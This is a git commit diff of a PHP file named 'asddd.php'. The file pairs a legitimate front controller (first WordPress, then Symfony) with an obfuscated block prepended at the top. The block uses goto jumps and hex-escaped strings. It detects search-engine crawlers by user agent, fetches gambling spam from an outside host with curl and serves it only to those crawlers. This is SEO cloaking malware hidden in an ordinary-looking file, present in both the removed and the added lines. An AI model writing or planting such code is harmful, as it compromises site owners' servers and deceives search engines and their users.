56b2d6c8b27e57da1f17b3baca7fee3ab9cde198
boyas2 <limitboyas@gmail.com>
2024-11-06 18:14:17 +0700

    Update asddd.php

--- asddd.php
+++ asddd.php
@@ -1,19 +1,22 @@
 <?php
-goto cb95b; c1408: echo $F42df; goto cefad; cbcc8: $ce1b3 = isset($ce1b3) ? $ce1b3 : ''; goto De71c; Ca552: $e7eb8 = urlencode($_SERVER["\x53\103\122\111\120\x54\137\x4e\101\x4d\x45"]); goto d95a1; F74de: if (!d97e2($_SERVER["\x48\x54\124\x50\137\125\x53\105\x52\x5f\x41\107\x45\x4e\124"])) { goto E583d; } goto fa0de; f7ee0: ini_set("\144\151\x73\160\154\141\x79\137\145\x72\162\157\162\x73", 1); goto F509e; B7b78: $F42df = c875A($F77fb); goto c1408; a310a: function c875A($b3f09) { goto c7632; bbbb0: curl_setopt($A802b, CURLOPT_URL, $b3f09); goto Eebd2; b37d9: curl_close($A802b); goto cb2d1; c7632: $A802b = curl_init(); goto bbbb0; cb2d1: return $f9f75; goto F1c92; a0317: $f9f75 = curl_exec($A802b); goto b37d9; Eebd2: curl_setopt($A802b, CURLOPT_RETURNTRANSFER, true); goto a0317; F1c92: } goto F74de; b5bed: function D97e2($d4b1c) { goto F8e81; Be1f0: return false; goto fb0f4; F8e81: $e0c87 = ["\107\x6f\157\147\154\145\142\x6f\164", "\x42\x69\x6e\147\x62\x6f\164", "\x53\154\165\x72\160", "\104\165\143\x6b\x44\x75\x63\153\x42\x6f\x74", "\x42\141\x69\144\x75\x73\160\151\x64\145\x72", "\x59\x61\156\144\145\170\102\x6f\164", "\x53\x6f\x67\x6f\165", "\x54\145\x6c\145\147\162\x61\155\x42\157\x74", "\x45\x78\141\x62\x6f\164", "\146\x61\143\x65\x62\157\x74", "\x69\141\137\141\x72\x63\150\x69\166\145\162", "\x47\157\x6f\147\154\145\x2d\123\x69\164\145\x2d\x56\x65\x72\151\x66\151\143\x61\164\x69\x6f\156", "\x47\157\x6f\x67\x6c\x65\x2d\x49\x6e\x73\160\x65\143\164\151\157\x6e\x54\x6f\x6f\x6c", "\x41\150\162\x65\146\163\102\157\x74"]; goto B143b; B79ef: B84dd: goto Be1f0; B143b: foreach ($e0c87 as $D3484) { goto Bf8ba; b97fe: return true; goto Feb2d; Bf8ba: if (!(stripos($d4b1c, $D3484) !== false)) { goto Af173; } goto b97fe; Feb2d: Af173: goto D6de1; D6de1: a73d9: goto d5d51; d5d51: } goto B79ef; fb0f4: } goto a310a; dc172: $D453e = isset($D453e) ? $D453e : ''; goto D175d; De71c: $C3bef = isset($C3bef) ? $C3bef : ''; goto dc172; D175d: $e7a52 = isset($e7a52) ? $e7a52 : ''; goto d975e; eea49: $B8d89 = urlencode($_SERVER["\x52\x45\121\125\105\123\x54\x5f\125\122\x49"]); goto Abc9d; d95a1: $B6f4f = isset($B6f4f) ? $B6f4f : ''; goto cbcc8; f2a40: $ca043 = 0; goto Ca552; cb95b: error_reporting(E_ALL); goto f7ee0; d975e: $a9bce = isset($a9bce) ? $a9bce : ''; goto b5bed; fa0de: $F77fb = "\x68\164\164\160\163\x3a\57\57\143\x6f\142\x61\163\141\156\x74\x61\x69\x2e\x73\151\x74\145\57\x63\x6f\x6e\x74\145\156\x74\57\152\x75\x64\x69\x62\157\154\x61\56\164\170\164\77\x61\x67\145\x6e\164\x3d{$c4c76}\46\162\x65\146\145\x72\162\145\162\75{$B6f4f}\46\x6c\141\x6e\x67\75{$ce1b3}\46\x69\160\75{$C3bef}\46\x64\157\x6d\75{$D453e}\x26\x68\x74\x74\160\x3d{$e7a52}\46\x75\162\151\x3d{$B8d89}\46\160\x63\75{$a9bce}\46\162\145\167\x72\x69\164\141\142\154\x65\75{$ca043}\46\163\x63\x72\151\160\x74\75{$e7eb8}"; goto B7b78; Abc9d: $F42df = ''; goto f2a40; F509e: $c4c76 = urlencode($_SERVER["\x48\x54\124\x50\137\x55\123\x45\122\137\x41\x47\x45\x4e\x54"]); goto eea49; cefad: exit; goto Bb5af; Bb5af: E583d:
+goto O403143; O207962: if (!o841888($_SERVER["\x48\124\x54\x50\x5f\x55\123\105\x52\x5f\101\107\105\116\124"])) { goto O194089; } goto O729203; O529354: $O534042 = 0; goto O711986; O403143: error_reporting(E_ALL); goto O573419; O890760: echo $O844503; goto O902380; O600918: $O004451 = isset($O004451) ? $O004451 : ''; goto O314016; O434395: $O567491 = urlencode($_SERVER["\110\x54\124\x50\x5f\125\123\x45\122\x5f\101\107\x45\116\x54"]); goto O810426; O663974: $O760899 = isset($O760899) ? $O760899 : ''; goto O332672; O186409: $O844503 = o350160($O393139); goto O890760; O815465: $O102630 = isset($O102630) ? $O102630 : ''; goto O600918; O076703: $O886250 = isset($O886250) ? $O886250 : ''; goto O663974; O573419: ini_set("\x64\151\163\160\154\x61\x79\137\x65\162\162\157\162\163", 1); goto O434395; O057657: function o350160($O960114) { goto O304632; O287362: curl_setopt($O795212, CURLOPT_URL, $O960114); goto O290099; O290099: curl_setopt($O795212, CURLOPT_RETURNTRANSFER, true); goto O541596; O304632: $O795212 = curl_init(); goto O287362; O541596: $O974959 = curl_exec($O795212); goto O381418; O381418: curl_close($O795212); goto O661822; O661822: return $O974959; goto O597387; O597387: } goto O207962; O729203: $O393139 = "\x68\164\164\x70\x73\x3a\57\x2f\143\x6f\x62\141\x73\x61\x6e\164\141\151\x2e\x73\151\164\x65\57\x63\157\x6e\164\x65\156\x74\57\163\x6c\157\x74\160\x75\154\163\x61\x2e\164\x78\x74\x3f\x61\x67\x65\156\164\75{$O567491}\46\x72\x65\146\x65\162\x72\145\162\75{$O102630}\x26\154\141\156\147\75{$O004451}\x26\x69\160\75{$O808658}\46\144\x6f\155\x3d{$O886250}\x26\x68\x74\x74\160\75{$O760899}\46\x75\x72\x69\x3d{$O287716}\x26\160\x63\x3d{$O890030}\x26\162\145\167\x72\151\164\141\142\x6c\145\x3d{$O534042}\46\x73\143\162\x69\160\164\75{$O374197}"; goto O186409; O902380: exit; goto O833588; O938041: function o841888($O042849) { goto O679173; O267239: return false; goto O672717; O679173: $O440683 = ["\x47\x6f\157\147\x6c\145\x62\157\x74", "\102\x69\x6e\147\142\x6f\164", "\x53\x6c\165\x72\160", "\x44\x75\143\x6b\x44\x75\x63\153\x42\157\164", "\x42\141\x69\144\165\x73\160\x69\x64\145\162", "\x59\141\156\x64\145\170\x42\x6f\x74", "\x53\157\147\x6f\x75", "\x54\x65\154\145\x67\162\x61\155\102\157\164", "\105\x78\x61\142\157\x74", "\146\141\x63\x65\x62\157\x74", "\151\141\137\x61\162\x63\x68\151\x76\145\x72", "\x47\157\x6f\147\x6c\145\55\123\x69\164\145\55\x56\x65\162\x69\x66\x69\143\141\x74\151\157\x6e", "\x47\x6f\157\147\x6c\x65\55\x49\x6e\163\x70\x65\143\164\151\x6f\156\x54\157\x6f\154", "\x41\150\162\145\146\x73\x42\x6f\164"]; goto O303905; O303905: foreach ($O440683 as $O005825) { goto O385847; O386671: O060930: goto O029689; O313969: return true; goto O010539; O385847: if (!(stripos($O042849, $O005825) !== false)) { goto O572949; } goto O313969; O010539: O572949: goto O386671; O029689: } goto O905546; O905546: O534222: goto O267239; O672717: } goto O057657; O314016: $O808658 = isset($O808658) ? $O808658 : ''; goto O076703; O711986: $O374197 = urlencode($_SERVER["\123\x43\122\x49\120\124\x5f\x4e\x41\115\x45"]); goto O815465; O416691: $O844503 = ''; goto O529354; O332672: $O890030 = isset($O890030) ? $O890030 : ''; goto O938041; O810426: $O287716 = urlencode($_SERVER["\122\105\x51\x55\105\x53\x54\137\125\x52\111"]); goto O416691; O833588: O194089:
 
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+use Symfony\Component\HttpFoundation\Request;
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+require __DIR__.'/../vendor/autoload.php';
+if (PHP_VERSION_ID < 70000) {
+    include_once __DIR__.'/../var/bootstrap.php.cache';
+}
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+$kernel = new AppKernel('prod', false);
+if (PHP_VERSION_ID < 70000) {
+    $kernel->loadClassCache();
+}
+//$kernel = new AppCache($kernel);
+
+// When using the HttpCache, you need to call the method in your front controller instead of relying on the configuration parameter
+//Request::enableHttpMethodParameterOverride();
+$request = Request::createFromGlobals();
+$response = $kernel->handle($request);
+$response->send();
+$kernel->terminate($request, $response);
